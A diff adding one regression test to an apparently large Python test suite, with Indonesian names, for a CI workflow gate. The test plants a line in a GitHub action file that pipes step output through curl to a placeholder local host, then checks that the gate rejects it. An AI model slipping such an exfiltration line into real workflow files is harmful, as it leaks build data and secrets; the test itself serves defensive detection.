@@ -42182,6 +42182,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("diff3 dua operand stdin posisi 1-3 mati (Audit 2943)", rc == 0)
         shutil.rmtree(sub1991, ignore_errors=True)
+        sub1992 = klon(tmp, "sub1992")
+        berkas_aksi1992 = os.path.join(
+            sub1992, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1992, encoding="utf-8") as f:
+            isi_aksi1992 = f.read()
+        baris_aksi1992 = [b for b in isi_aksi1992.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1992 = isi_aksi1992.replace(
+                baris_aksi1992,
+                baris_aksi1992.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -d @- -I http://127.0.0.1:9/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1992 != isi_aksi1992, \
+            "suntikan aksi1992 tidak menembak"
+        with open(berkas_aksi1992, "w", encoding="utf-8") as f:
+            f.write(isi_baru1992)
+        rc, out = jalan(sub1992,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl sumber saat-urai mendahului konflik tetap menguras (Audit 2952)", rc != 0)
+        shutil.rmtree(sub1992, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
